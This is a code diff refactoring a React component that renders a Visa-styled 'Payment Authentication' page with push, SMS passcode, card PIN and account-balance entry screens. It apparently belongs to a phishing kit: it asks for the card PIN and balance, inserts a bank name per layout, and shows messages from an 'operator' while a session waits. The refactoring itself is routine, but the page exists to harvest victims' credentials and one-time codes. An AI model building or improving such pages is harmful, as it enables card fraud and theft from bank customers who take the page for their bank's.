@@ -58,52 +58,22 @@ function getCardLogoPath(cardBrand: "visa" | "mastercard" | undefined): string {
   return `${IMAGE_BASE}/visa.svg`;
 }
 
-function inferCardBrand(cardNumber: string | undefined): "visa" | "mastercard" | undefined {
-  if (!cardNumber) return undefined;
-  const digits = cardNumber.replace(/\D/g, "");
-  if (digits.startsWith("4")) return "visa";
-  if (digits.startsWith("5") || digits.startsWith("22")) return "mastercard";
-  return undefined;
-}
-
-function CardDisplay({
-  cardNumber,
-  cardBrand,
-}: {
-  cardNumber: string;
-  cardBrand?: "visa" | "mastercard";
-}) {
-  const brand = cardBrand ?? inferCardBrand(cardNumber) ?? "visa";
-  const displayNumber =
-    cardNumber.includes("XXXX") || cardNumber.includes("****")
-      ? cardNumber.replace(/\*+/g, "••••").replace(/X+/g, "••••")
-      : cardNumber;
-  return (
-
-      <span id="contentBlock-maskedpan" className="always-left-to-right" style={{ fontFamily: "monospace", letterSpacing: 2 }}>
-        {displayNumber}
-      </span>
-    
-
-  );
-}
-
-function PreviewBanner() {
-  return (
-    <div
-      style={{
-        padding: "8px 16px",
-        background: "#fff3cd",
-        color: "#856404",
-        fontSize: 14,
-        textAlign: "center",
-        borderBottom: "1px solid #ffc107",
-      }}
-    >
-      Preview mode – no API connection
-    </div>
-  );
-}
+const overlayStyles = {
+  position: "fixed" as const,
+  inset: 0,
+  background: "rgba(0,0,0,0.5)",
+  display: "flex",
+  alignItems: "center",
+  justifyContent: "center",
+  zIndex: 9999,
+};
+const errorBannerStyles = {
+  padding: "8px 16px",
+  background: "#f8d7da",
+  color: "#721c24",
+  fontSize: 14,
+  textAlign: "center" as const,
+};
 
 function Spinner({ size = 48 }: { size?: number }) {
   const border = Math.max(2, Math.floor(size / 8));
@@ -117,6 +87,61 @@ function Spinner({ size = 48 }: { size?: number }) {
         } as React.CSSProperties
       }
     />
+  );
+}
+
+function VerificationPage({
+  children,
+  footer,
+  bank,
+  cardBrand,
+  isPreview,
+  inProgress,
+  hasParams,
+  error,
+}: {
+  children: React.ReactNode;
+  footer?: React.ReactNode;
+  bank?: string;
+  cardBrand?: "visa" | "mastercard";
+  isPreview: boolean;
+  inProgress: boolean;
+  hasParams: boolean;
+  error?: string | null;
+}) {
+  return (
+    <div>
+      <meta charSet="utf-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <title>Validate Authentication Credential</title>
+      <NBD2Styles />
+      {isPreview && (
+        <div
+          style={{
+            padding: "8px 16px",
+            background: "#fff3cd",
+            color: "#856404",
+            fontSize: 14,
+            textAlign: "center",
+            borderBottom: "1px solid #ffc107",
+          }}
+        >
+          Preview mode – no API connection
+        </div>
+      )}
+      {inProgress && hasParams && (
+        <div style={overlayStyles}>
+          <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
+            <Spinner size={48} />
+            <span>Processing...</span>
+          </div>
+        </div>
+      )}
+      {error && <div style={errorBannerStyles}>{error}</div>}
+      <Shell bank={bank} cardBrand={cardBrand} footer={footer}>
+        {children}
+      </Shell>
+    </div>
   );
 }
 
@@ -135,7 +160,6 @@ function TransactionBody({
   const amount = isPreview ? PLACEHOLDER_AMOUNT : transactionDetails?.amount ?? PLACEHOLDER_AMOUNT;
   const date = isPreview ? PLACEHOLDER_DATE : transactionDetails?.date ?? PLACEHOLDER_DATE;
   const card = isPreview ? PLACEHOLDER_CARD : transactionDetails?.cardNumber ?? PLACEHOLDER_CARD;
-  const cardBrand = transactionDetails?.cardBrand;
 
   const intro =
     variant === "sms"
@@ -183,13 +207,17 @@ function TransactionBody({
         )}
       </p>
       {(showPaymentDetails || variant === "balance" || variant === "pin") && (
-        <CardDisplay cardNumber={card} cardBrand={cardBrand} />
+        <span id="contentBlock-maskedpan" className="always-left-to-right" style={{ fontFamily: "monospace", letterSpacing: 2 }}>
+          {card.includes("XXXX") || card.includes("****")
+            ? card.replace(/\*+/g, "••••").replace(/X+/g, "••••")
+            : card}
+        </span>
       )}
     </div>
   );
 }
 
-function NBD2Shell({
+function Shell({
   children,
   footer,
   bank,
@@ -262,7 +290,7 @@ const defaultResendState: ResendState = {
   resending: false,
 };
 
-export function NBD2(props: BankLayoutProps) {
+export function VerificationUi(props: BankLayoutProps) {
   const hasParams = Boolean(props.apiBase && props.channelSlug && props.sessionId);
 
   const hookResult = useBankVerification({
@@ -305,54 +333,41 @@ export function NBD2(props: BankLayoutProps) {
   // --- Push layout ---
   if (baseLayout === "push" && showLive) {
     return (
-      <div>
-        <meta charSet="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Validate Authentication Credential</title>
-        <NBD2Styles />
-        {isPreview && <PreviewBanner />}
-        {inProgress && hasParams && (
-          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.5)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
-            <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
-              <Spinner size={48} />
-              <span>Processing...</span>
+      <VerificationPage
+        bank={bank}
+        cardBrand={transactionDetails?.cardBrand}
+        isPreview={isPreview}
+        inProgress={inProgress}
+        hasParams={hasParams}
+        error={error}
+      >
+        <h2 className="screenreader-only">Confirm on your device</h2>
+        <div className="visa-row">
+          <div className="visa-col-12 visa-validate">
+            <strong>Payment Authentication</strong>
+          </div>
+          <div className="row">
+            <div className="col-12" id="ValidateOneUpMessage">
+              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="push" />
             </div>
           </div>
-        )}
-        {error && (
-          <div style={{ padding: "8px 16px", background: "#f8d7da", color: "#721c24", fontSize: 14, textAlign: "center" }}>
-            {error}
-          </div>
-        )}
-        <NBD2Shell bank={bank} cardBrand={transactionDetails?.cardBrand}>
-          <h2 className="screenreader-only">Confirm on your device</h2>
-          <div className="visa-row">
-            <div className="visa-col-12 visa-validate">
-              <strong>Payment Authentication</strong>
+        </div>
+        <div className="visa-row">
+          <div className="col-12 visa-styling text-center">
+            <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
+              <Spinner size={64} />
             </div>
-            <div className="row">
-              <div className="col-12" id="ValidateOneUpMessage">
-                <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="push" />
-              </div>
-            </div>
+            <h3 className="visa-validate" style={{ marginBottom: 8 }}>
+              Confirm on your device
+            </h3>
+            <p className="mb-0">
+              {bank
+                ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
+                : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
+            </p>
           </div>
-          <div className="visa-row">
-            <div className="col-12 visa-styling text-center">
-              <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
-                <Spinner size={64} />
-              </div>
-              <h3 className="visa-validate" style={{ marginBottom: 8 }}>
-                Confirm on your device
-              </h3>
-              <p className="mb-0">
-                {bank
-                  ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
-                  : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
-              </p>
-            </div>
-          </div>
-        </NBD2Shell>
-      </div>
+        </div>
+      </VerificationPage>
     );
   }
 
@@ -370,75 +385,65 @@ export function NBD2(props: BankLayoutProps) {
     };
 
     return (
-      <div>
-        <meta charSet="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Validate Authentication Credential</title>
-        <NBD2Styles />
-        {isPreview && <PreviewBanner />}
-        {inProgress && hasParams && (
-          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.5)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
-            <div style={{ background: "#fff", padding: 24, borderRadius: 8 }}>Processing...</div>
+      <VerificationPage
+        bank={bank}
+        cardBrand={transactionDetails?.cardBrand}
+        isPreview={isPreview}
+        inProgress={inProgress}
+        hasParams={hasParams}
+        error={error}
+      >
+        <h2 className="screenreader-only">Balance verification</h2>
+        <div className="visa-row">
+          <div className="visa-col-12 visa-validate">
+            <strong>Payment Authentication</strong>
+          </div>
+          <div className="row">
+            <div className="col-12" id="ValidateOneUpMessage">
+              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="balance" />
+            </div>
+          </div>
+        </div>
+        {operatorMessage && (
+          <div className={`form-group ${messageClass}`} style={{ marginTop: 8 }}>
+            {operatorMessage.message}
           </div>
         )}
-        {error && (
-          <div style={{ padding: "8px 16px", background: "#f8d7da", color: "#721c24", fontSize: 14, textAlign: "center" }}>
-            {error}
-          </div>
-        )}
-        <NBD2Shell bank={bank} cardBrand={transactionDetails?.cardBrand}>
-          <h2 className="screenreader-only">Balance verification</h2>
+        <form onSubmit={handleBalanceSubmit} autoComplete="off" noValidate>
           <div className="visa-row">
-            <div className="visa-col-12 visa-validate">
-              <strong>Payment Authentication</strong>
-            </div>
-            <div className="row">
-              <div className="col-12" id="ValidateOneUpMessage">
-                <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="balance" />
+            <div className="col-12 visa-styling">
+              <div className="form-group text-center">
+                <label htmlFor="balance-input">Balance</label>
+                <input
+                  id="balance-input"
+                  type="text"
+                  inputMode="decimal"
+                  className="form-control visa-styling"
+                  value={balance}
+                  onChange={(e) => onBalanceChange(e.target.value)}
+                  disabled={submitting}
+                  placeholder="e.g. 1,234.56"
+                />
+                <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
+                  <button
+                    type="submit"
+                    className="visa-styling btn btn-primary text-uppercase vba-button"
+                    disabled={submitting || !canSubmit}
+                  >
+                    {submitting ? "Submitting..." : "Submit"}
+                  </button>
+                </div>
+                {submitting && (
+                  <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+                    <Spinner size={40} />
+                    <span>Waiting for confirmation...</span>
+                  </div>
+                )}
               </div>
             </div>
           </div>
-          {operatorMessage && (
-            <div className={`form-group ${messageClass}`} style={{ marginTop: 8 }}>
-              {operatorMessage.message}
-            </div>
-          )}
-          <form onSubmit={handleBalanceSubmit} autoComplete="off" noValidate>
-            <div className="visa-row">
-              <div className="col-12 visa-styling">
-                <div className="form-group text-center">
-                  <label htmlFor="balance-input">Balance</label>
-                  <input
-                    id="balance-input"
-                    type="text"
-                    inputMode="decimal"
-                    className="form-control visa-styling"
-                    value={balance}
-                    onChange={(e) => onBalanceChange(e.target.value)}
-                    disabled={submitting}
-                    placeholder="e.g. 1,234.56"
-                  />
-                  <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
-                    <button
-                      type="submit"
-                      className="visa-styling btn btn-primary text-uppercase vba-button"
-                      disabled={submitting || !canSubmit}
-                    >
-                      {submitting ? "Submitting..." : "Submit"}
-                    </button>
-                  </div>
-                  {submitting && (
-                    <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-                      <Spinner size={40} />
-                      <span>Waiting for confirmation...</span>
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
-          </form>
-        </NBD2Shell>
-      </div>
+        </form>
+      </VerificationPage>
     );
   }
 
@@ -451,10 +456,9 @@ export function NBD2(props: BankLayoutProps) {
     const wrongCode = (lp?.wrongCode as boolean) ?? false;
     const expiredCode = (lp?.expiredCode as boolean) ?? false;
     const onTryAgain = (lp?.onTryAgain as () => void) ?? (() => {});
-    const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
-    const submitting = (lp?.submitting as boolean) ?? false;
     const resendState = (lp?.resendState as ResendState) ?? defaultResendState;
     const { secondsLeft, canResend, onResend, resending } = resendState;
+    const submitting = (lp?.submitting as boolean) ?? false;
 
     const pinHandleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
       const v = e.target.value.replace(/\D/g, "").slice(0, 4);
@@ -467,93 +471,83 @@ export function NBD2(props: BankLayoutProps) {
     };
 
     return (
-      <div>
-        <meta charSet="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Validate Authentication Credential</title>
-        <NBD2Styles />
-        {isPreview && <PreviewBanner />}
-        {inProgress && hasParams && (
-          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.5)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
-            <div style={{ background: "#fff", padding: 24, borderRadius: 8 }}>Processing...</div>
+      <VerificationPage
+        bank={bank}
+        cardBrand={transactionDetails?.cardBrand}
+        isPreview={isPreview}
+        inProgress={inProgress}
+        hasParams={hasParams}
+        error={error}
+      >
+        <h2 className="screenreader-only">Enter your PIN</h2>
+        <div className="visa-row">
+          <div className="visa-col-12 visa-validate">
+            <strong>Payment Authentication</strong>
           </div>
-        )}
-        {error && (
-          <div style={{ padding: "8px 16px", background: "#f8d7da", color: "#721c24", fontSize: 14, textAlign: "center" }}>
-            {error}
-          </div>
-        )}
-        <NBD2Shell bank={bank} cardBrand={transactionDetails?.cardBrand}>
-          <h2 className="screenreader-only">Enter your PIN</h2>
-          <div className="visa-row">
-            <div className="visa-col-12 visa-validate">
-              <strong>Payment Authentication</strong>
-            </div>
-            <div className="row">
-              <div className="col-12" id="ValidateOneUpMessage">
-                <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="pin" />
-              </div>
+          <div className="row">
+            <div className="col-12" id="ValidateOneUpMessage">
+              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="pin" />
             </div>
           </div>
-          {(wrongCode || expiredCode) && (
-            <div className="form-group" id="ErrorMessage">
-              <span className="field-validation-error">
-                {wrongCode ? "Wrong PIN. Please try again." : "Code expired. Please request a new code."}
+        </div>
+        {(wrongCode || expiredCode) && (
+          <div className="form-group" id="ErrorMessage">
+            <span className="field-validation-error">
+              {wrongCode ? "Wrong PIN. Please try again." : "Code expired. Please request a new code."}
+            </span>
+          </div>
+        )}
+        {operatorMessage && (
+          <div className={`form-group ${messageClass}`}>{operatorMessage.message}</div>
+        )}
+        <div className="visa-row">
+          <div className="col-12 visa-styling">
+            <div className="form-group text-center">
+              <label htmlFor="pin-input">PIN</label>
+              <input
+                id="pin-input"
+                type={pinMasked ? "password" : "text"}
+                inputMode="numeric"
+                maxLength={4}
+                className="form-control visa-styling"
+                value={pinValue}
+                onChange={pinHandleChange}
+                disabled={submitting}
+                placeholder="••••"
+              />
+              <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
+                <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
+                {" "}Show PIN
+              </label>
+            </div>
+          </div>
+        </div>
+        <div className="visa-row">
+          <div className="col-12 text-center">
+            {canResend ? (
+              <button
+                id="ResendLink"
+                className="btn btn-link resend-link no-decoration text-uppercase"
+                type="button"
+                onClick={handlePinResend}
+                disabled={resending || submitting}
+              >
+                {resending ? "Sending..." : "RESEND PIN"}
+              </button>
+            ) : (
+              <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
+                Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
               </span>
-            </div>
-          )}
-          {operatorMessage && (
-            <div className={`form-group ${messageClass}`}>{operatorMessage.message}</div>
-          )}
-          <div className="visa-row">
-            <div className="col-12 visa-styling">
-              <div className="form-group text-center">
-                <label htmlFor="pin-input">PIN</label>
-                <input
-                  id="pin-input"
-                  type={pinMasked ? "password" : "text"}
-                  inputMode="numeric"
-                  maxLength={4}
-                  className="form-control visa-styling"
-                  value={pinValue}
-                  onChange={pinHandleChange}
-                  disabled={submitting}
-                  placeholder="••••"
-                />
-                <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
-                  <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
-                  {" "}Show PIN
-                </label>
-              </div>
-            </div>
+            )}
           </div>
-          <div className="visa-row">
-            <div className="col-12 text-center">
-              {canResend ? (
-                <button
-                  id="ResendLink"
-                  className="btn btn-link resend-link no-decoration text-uppercase"
-                  type="button"
-                  onClick={handlePinResend}
-                  disabled={resending || submitting}
-                >
-                  {resending ? "Sending..." : "RESEND PIN"}
-                </button>
-              ) : (
-                <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
-                  Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
-                </span>
-              )}
-            </div>
+        </div>
+        {submitting && (
+          <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+            <Spinner size={40} />
+            <span>Waiting for confirmation...</span>
           </div>
-          {submitting && (
-            <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-              <Spinner size={40} />
-              <span>Waiting for confirmation...</span>
-            </div>
-          )}
-        </NBD2Shell>
-      </div>
+        )}
+      </VerificationPage>
     );
   }
 
@@ -591,45 +585,14 @@ export function NBD2(props: BankLayoutProps) {
       : operatorMessage?.message ?? "";
 
   return (
-    <div>
-      <meta charSet="utf-8" />
-      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-      <title>Validate Authentication Credential</title>
-      <NBD2Styles />
-      {isPreview && <PreviewBanner />}
-      {inProgress && hasParams && (
-        <div
-          style={{
-            position: "fixed",
-            inset: 0,
-            background: "rgba(0,0,0,0.5)",
-            display: "flex",
-            alignItems: "center",
-            justifyContent: "center",
-            zIndex: 9999,
-          }}
-        >
-          <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
-            <Spinner size={48} />
-            <span>Processing...</span>
-          </div>
-        </div>
-      )}
-      {error && (
-        <div
-          style={{
-            padding: "8px 16px",
-            background: "#f8d7da",
-            color: "#721c24",
-            fontSize: 14,
-            textAlign: "center",
-          }}
-        >
-          {error}
-        </div>
-      )}
-      <NBD2Shell bank={bank} cardBrand={transactionDetails?.cardBrand}
-        footer={
+    <VerificationPage
+      bank={bank}
+      cardBrand={transactionDetails?.cardBrand}
+      isPreview={isPreview}
+      inProgress={inProgress}
+      hasParams={hasParams}
+      error={error}
+      footer={
           <form
             action="/Api/2_1_0/NextStep/ValidateCredential"
             autoComplete="off"
@@ -755,19 +718,18 @@ export function NBD2(props: BankLayoutProps) {
             </div>
           </form>
         }
-      >
-        <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
-        <div className="visa-row">
-          <div className="visa-col-12 visa-validate">
-            <strong>Payment Authentication</strong>
-          </div>
-          <div className="row">
-            <div className="col-12" id="ValidateOneUpMessage">
-              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="sms" />
-            </div>
+    >
+      <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
+      <div className="visa-row">
+        <div className="visa-col-12 visa-validate">
+          <strong>Payment Authentication</strong>
+        </div>
+        <div className="row">
+          <div className="col-12" id="ValidateOneUpMessage">
+            <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="sms" />
           </div>
         </div>
-      </NBD2Shell>
-    </div>
+      </div>
+    </VerificationPage>
   );
 }
